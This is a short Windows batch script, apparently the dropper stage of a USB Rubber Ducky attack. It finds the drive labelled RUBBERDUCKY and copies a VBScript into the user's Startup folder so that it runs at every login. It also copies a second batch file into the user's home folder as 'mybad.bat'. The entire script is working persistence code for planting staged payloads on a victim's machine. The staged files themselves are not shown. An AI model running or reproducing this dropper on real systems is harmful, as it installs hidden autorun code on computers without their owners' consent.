@echo off

for %%a in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do vol %%a: 2>nul | find "RUBBERDUCKY" >nul && set myDrive=%%a:
cd /D "%myDrive%\Injctr"
echo.
echo Coping the first stage!
copy "%CD%\run.vbs" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.vbs" >nul
echo Coping the second stage!
copy "%CD%\start.bat" "C:\Users\%username%\mybad.bat" >nul
echo Done!
pause